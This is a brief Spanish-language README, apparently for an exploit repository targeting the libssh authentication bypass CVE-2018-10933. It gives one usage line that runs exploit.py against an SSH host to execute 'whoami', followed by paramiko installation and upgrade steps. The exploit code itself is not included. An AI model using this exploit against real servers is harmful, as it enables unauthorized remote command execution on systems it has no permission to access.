# libssh

Ejecucion de comandos libssh CVE-2018-10933

![image](https://user-images.githubusercontent.com/67207446/235362690-e590b25f-2a75-48f8-afa9-caf0bf4818d3.png)

## Ejecucion

python3 exploit.py --host 172.16.20.x -p 22 "whoami"

## Instalacion y actualizacion de paramiko

Instalacion:

sudo apt-get update
sudo apt-get install python-paramiko

Actualizacion:

pip install --upgrade paramiko
